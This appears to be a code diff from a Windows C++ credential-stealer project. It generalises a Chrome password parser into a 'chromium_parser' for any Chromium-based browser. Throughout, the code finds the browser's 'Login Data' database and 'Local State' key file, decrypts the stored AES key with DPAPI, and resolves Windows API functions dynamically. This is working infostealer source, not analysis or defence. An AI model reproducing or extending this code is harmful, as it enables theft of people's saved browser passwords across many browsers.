@@ -6,7 +6,7 @@
 #include <json.hpp>
 
 
-List<AccountData> chrome_parser::collect_data()
+List<AccountData> chromium_parser::collect_data()
 {
 	List<AccountData> out_data;
 	if (!get_path_to_db()) return out_data;
@@ -99,7 +99,7 @@ List<AccountData> chrome_parser::collect_data()
 
 
 
-bool chrome_parser::get_path_to_db()
+bool chromium_parser::get_path_to_db()
 {
 	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");
 
@@ -110,11 +110,11 @@ bool chrome_parser::get_path_to_db()
 	char _path[MAX_PATH];
 	if(get_user_path(NULL, local_data_app, NULL, 0, _path) != S_OK) return false;
 	m_chrome_sqlite_path = _path;
-	m_chrome_sqlite_path += R"(\Google\Chrome\User Data\Default\Login Data)";
+	m_chrome_sqlite_path += m_chromium_base_path+R"(\User Data\Default\Login Data)";
 	return true;	
 }
 
-bool chrome_parser::get_decryption_key()
+bool chromium_parser::get_decryption_key()
 {
 
 	std::string keyBase64;
@@ -144,7 +144,7 @@ bool chrome_parser::get_decryption_key()
 	return true;
 }
 
-bool chrome_parser::get_chrome_key(std::string& key, unsigned long& keySize)
+bool chromium_parser::get_chrome_key(std::string& key, unsigned long& keySize)
 {
 
 	HANDLE hFile = INVALID_HANDLE_VALUE;
@@ -214,7 +214,7 @@ bool chrome_parser::get_chrome_key(std::string& key, unsigned long& keySize)
 	return true;
 }
 
-bool chrome_parser::get_key_path(String& keyPath)
+bool chromium_parser::get_key_path(String& keyPath)
 {
 	const auto get_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");
 	//получаем путь до AppData
@@ -225,7 +225,7 @@ bool chrome_parser::get_key_path(String& keyPath)
 	{
 		//файл Local State содержит зашифрованный ключ для AES256-GCM (base64+DPAPI)
 		keyPath = path;
-		keyPath += "\\Google\\Chrome\\User Data\\Local State";
+		keyPath += m_chromium_base_path+R"(\User Data\Local State)";
 
 		return true;
 	}
@@ -233,7 +233,7 @@ bool chrome_parser::get_key_path(String& keyPath)
 	return false;
 }
 
-bool chrome_parser::dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText)
+bool chromium_parser::dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText)
 {
 	DATA_BLOB in;
 	DATA_BLOB out;
@@ -260,7 +260,7 @@ bool chrome_parser::dpapi_decrypt(unsigned char* encText, unsigned long encTextS
 	return false;
 }
 
-bool chrome_parser::init_for_chrome_80()
+bool chromium_parser::init_for_chrome_80()
 {
 	bool bRet = false;
 	do
@@ -296,7 +296,7 @@ bool chrome_parser::init_for_chrome_80()
 	return bRet;	
 }
 
-bool chrome_parser::init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey)
+bool chromium_parser::init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey)
 {
 	bool bRet = true;
 	
@@ -313,7 +313,7 @@ bool chrome_parser::init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey)
 	return bRet;	
 }
 
-bool chrome_parser::key_decrypt(std::string keyBase64, DWORD keySize, char* decKey)
+bool chromium_parser::key_decrypt(std::string keyBase64, DWORD keySize, char* decKey)
 {
 	char* keyEncDPAPI = NULL;
 	DWORD keyEncDPAPISize = 0;
